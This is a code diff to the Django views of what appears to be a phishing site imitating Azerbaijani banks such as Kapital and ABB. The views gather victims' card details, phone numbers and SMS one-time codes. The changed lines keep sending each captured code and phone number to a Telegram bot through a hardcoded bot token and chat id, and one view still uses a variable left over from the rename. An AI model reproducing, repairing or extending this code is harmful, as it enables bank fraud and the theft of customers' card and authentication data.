@@ -151,12 +151,13 @@ def loading(request):
     return render(request, "pages/master.html")
 
 def kapital(request):
-    last_contact = ContactModel.objects.latest('created_at')
-    last_contact.bankname=""
-    last_contact.save()
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
+    contact.bankname=""
+    contact.save()
     contex = {
-        'last_contact_id': last_contact.id,
-        "amount":last_contact.amount
+        'last_contact_id': contact.id,
+        "amount":contact.amount
     }
     return render(request, "pages/kapital.html",contex)
 
@@ -333,11 +334,12 @@ def approve_contact_api(request, pk):
 
 @ensure_csrf_cookie
 def abb(request):
-    last_contact = ContactModel.objects.latest('created_at')
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
     
     context = {
-    'amount':last_contact.amount,
-    'cc': last_contact.cc[-4:],
+    'amount':contact.amount,
+    'cc': contact.cc[-4:],
     }
     return render( request,'pages/abb3d.html' ,context)
 
@@ -347,14 +349,15 @@ def rabite(request):
 
 def dsecazericard(request):
     sms = request.POST.get('secpass')
-    last_contact = ContactModel.objects.latest('created_at')
-    last_contact.sms=sms
-    last_contact.save()
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
+    contact.sms=sms
+    contact.save()
     context = {
-        'last_contact_id': last_contact.id,
+        'last_contact_id': contact.id,
 
     }
-    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
+    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nsms:{contact.sms}|number{contact.phone}')
 
     return render( request,'pages/loading.html',context )
 
@@ -363,7 +366,8 @@ def page_not_found(request, exception):
 
 @ensure_csrf_cookie  
 def dseckapital(request):
-    last_contact = ContactModel.objects.latest('created_at')
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
     context = {
         'last_contact_id': last_contact.id,
     }
@@ -377,11 +381,10 @@ def dseckapital(request):
             # for example, you can display an error message to the user
             return render(request, 'pages/kapital.html')
         concatenated = input1 + input2+input3+input4
-        last_contact = ContactModel.objects.latest('created_at')
-        last_contact.sms=concatenated
-        last_contact.bankname=""
-        last_contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
+        contact.sms=concatenated
+        contact.bankname=""
+        contact.save()
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nnumber{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html', )
     
     return render( request,'pages/loading.html',context )
